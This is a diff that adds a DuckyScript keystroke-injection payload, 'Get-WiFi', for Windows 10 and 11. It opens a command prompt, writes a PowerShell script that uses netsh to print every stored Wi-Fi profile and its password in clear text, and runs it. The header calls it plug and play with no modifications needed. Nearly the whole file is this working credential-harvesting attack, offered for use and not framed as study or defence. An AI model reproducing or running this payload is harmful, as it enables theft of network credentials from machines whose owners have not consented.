@@ -1,0 +1,21 @@
+REM     Title: Get-WiFi
+
+REM     Author: invad3rsam
+
+REM     Description: This payload can execute to fetch all the Wireless passwords stored in a system.
+
+REM     Target: Windows 10, 11
+
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING echo "(netsh wlan show profiles) | Select-String \"\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\W+\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize" > Get-Wifi.ps1
+DELAY 100
+STRING powershell Get-Wifi.ps1 | iex
+ENTER
